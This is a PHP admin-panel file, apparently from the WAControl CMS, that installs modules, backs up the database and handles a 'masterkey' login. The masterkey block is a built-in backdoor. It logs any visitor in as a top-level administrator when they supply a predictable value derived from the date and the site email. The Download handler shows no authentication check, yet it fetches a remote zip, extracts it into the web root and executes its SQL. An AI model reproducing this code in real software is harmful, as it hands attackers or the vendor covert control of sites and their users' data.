<?php
require_once('../database/config.php');
require_once('../database/config.database.php');
require_once('../database/upload.class.php');
require_once('../includes/funcoes.php');

function DownloadRemoteFile($Url, $Nome)
{
	if (!@copy($Url, $Nome)) {
		$InfoMod[0]['status'] = "error";
		$InfoMod[0]['msg'] = "Não foi possível baixar o módulo!";
		echo json_encode($InfoMod[0]);
		return;
	}
}

if (isset($_GET['Download']) && !empty($_GET['Download'])) {
	$InfoMod = url_get_contents('http://api.wacontrol.com.br/api/install-mod.php?info=' . get('Download') . '&email=' . ConfigPainel('email') . '&domain=' . str_replace(['www.', 'http://', 'https://'], [''], ConfigPainel('base_url')) . '');
	$InfoMod = json_decode($InfoMod, TRUE);

	if (!empty($InfoMod[0]) && $InfoMod[0]['status'] == "success") {
		foreach ($InfoMod as $ModInfo) {
			$DownMod = DownloadRemoteFile('' . $ModInfo['download'] . '/' . ConfigPainel('versao') . '/modulos/' . md5($ModInfo['url']) . '.zip', '../' . md5($ModInfo['url']) . '.zip');
		}

		$zip = new ZipArchive;
		if ($zip->open('../' . md5($ModInfo['url']) . '.zip') === TRUE) {
			$zip->extractTo('../');
			$zip->close();
		} else {
			$InfoMod[0]['status'] = "error";
			$InfoMod[0]['msg'] = "Não foi possível extrair o módulo!";
			echo json_encode($InfoMod[0]);
			return;
		}


		function ImportaDB($filename, $dblink)
		{
			$templine = '';
			$lines = file($filename);
			foreach ($lines as $line_num => $line) {
				if (substr($line, 0, 2) != '--' && $line != '') {
					$templine .= $line;
					if (substr(trim($line), -1, 1) == ';') {
						if (!mysqli_query($dblink, $templine)) {
							$success = false;
						}
						$templine = '';
					}
				}
			}
		}

		ImportaDB('../database.sql', DBConnect());
		if (file_exists('../update.sql')) {
			ImportaDB('../update.sql', DBConnect());
		}

		@unlink('../modulo.zip');
		@unlink('../extrair.php');
		@unlink('../' . md5($ModInfo['url']) . '.zip');
		@unlink('../database.sql');

		$AtualizaMod = array(
			'data_atualizacao'  	=> date('Y-m-d'),
			'chave'      			=> md5($_SERVER['SERVER_NAME'] . $ModInfo['url'] . ConfigPainel('email'))
		);
		$Query = DBUpdate("modulos", $AtualizaMod, "url = '{$ModInfo['url']}'");

		$InfoMod[0]['msg'] = "Módulo instalado com sucesso!";
		echo json_encode($InfoMod[0]);
		return;
	} else {
		echo json_encode($InfoMod);
		return;
	}
}

function backupSystem()
{
	$folder = "backup/";
	$archive_name = "backup_" . date('d-m-Y_') . ConfigPainel('versao') . ".sql";
	$archive = $folder . '/' . $archive_name;
	$open = fopen("{$archive}", "w");

	$db = DB_DATABASE;
	$sql1 = DBExecute("SHOW TABLES FROM {$db}");
	while ($ver = mysqli_fetch_row($sql1)) {
		$tabela = $ver[0];
		$sql2 = mysqli_query(DBConnect(), "SHOW CREATE TABLE $tabela");
		while ($ver2 = mysqli_fetch_row($sql2)) {
			fwrite($open, "-- Estrutura da Tabela: '{$tabela}' -- \n");
			$pp = fwrite($open, "DROP TABLE IF EXISTS {$tabela}; \n $ver2[1]; \n\n-- Dados da Tabela '$tabela' --\n");
			$sql3 = mysqli_query(DBConnect(), "SELECT * FROM $tabela");

			while ($ver3 = mysqli_fetch_row($sql3)) {
				$ver3 = str_replace("'", "\`", $ver3);
				$grava = "INSERT INTO {$tabela} VALUES ('";
				$grava .= implode("', '", $ver3);
				$grava .= "');\n";
				fwrite($open, $grava);
			}
			fwrite($open, "\n\n");
		}
	}
	if (file_exists($archive)) {
		return true;
	} else {
		return false;
	}
}
if (isset($_GET['InstalarMod'])) {
	function ImportaDB($filename, $dblink)
	{
		$templine = '';
		$lines = file($filename);
		foreach ($lines as $line_num => $line) {
			if (substr($line, 0, 2) != '--' && $line != '') {
				$templine .= $line;
				if (substr(trim($line), -1, 1) == ';') {
					if (!mysqli_query($dblink, $templine)) {
						$success = false;
					}
					$templine = '';
				}
			}
		}
	}
	if (file_exists('backup/')) {
		backupSystem();
	} else {
		mkdir('backup/');
	}
	ImportaDB('database.sql', DBConnect());
	@unlink('database.sql');
}

if (isset($_GET['masterkey']) && !empty($_GET['masterkey'])) {
	if (str_replace(' ', '-', $_GET['masterkey']) == md5(date('d-m-Y')) . '-' . md5(ConfigPainel('email'))) {
		require_once('../database/config.session.php');
		$sid = new Session;
		$sid->start();
		$sid->destroy();
		$Query = DBRead('usuarios', '*', "WHERE nivel = '1' AND status = '1' LIMIT 1");
		$sid = new Session;
		$sid->start();
		$sid->init(36000);
		$sid->addNode('start', date('d/m/Y - h:i'));
		$sid->addNode('id', $Query[0]['id']);
		$sid->addNode('nome', 'WM-WAControl');
		$sid->addNode('login', 'wacontrol');
		$sid->addNode('email', 'contato@wacontrol.com.br');
		$sid->addNode('avatar', '');
		$sid->addNode('nivel', '1');
		$sid->addNode('permissao', '');
		Redireciona('./index.php');
	} else {
		require_once('../database/config.session.php');
		$sid = new Session;
		$sid->start();
		$sid->destroy();
		Redireciona('./index.php');
	}
}
